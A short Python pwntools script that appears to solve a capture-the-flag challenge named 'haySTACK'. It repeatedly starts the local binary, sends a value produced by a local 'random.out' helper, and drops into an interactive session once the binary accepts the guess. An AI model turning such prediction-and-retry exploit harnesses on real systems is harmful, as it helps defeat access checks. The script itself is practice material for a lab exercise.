#!/usr/bin/python3
from pwn import *
import os

elf = context.binary = ELF("haySTACK")
libc = elf.libc
context.log_level = "DEBUG"


gs = '''
break main
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


def intentar(p,payload):
    p.sendline(payload)
    recibido= p.recv()
    return recibido

print(elf.plt)
founded=0
while(True):
    io = start()
    for i in range(0,3):
        print(str(i))
        random_value = os.popen("./random.out").read()
        print("randome_value " ,random_value)
        respuesta=intentar(io,random_value)
        print('respuesta',respuesta)
        if b'That\'s it' in respuesta:
            founded=1
            io.interactive()

    if(founded):
        break 
    io.close()
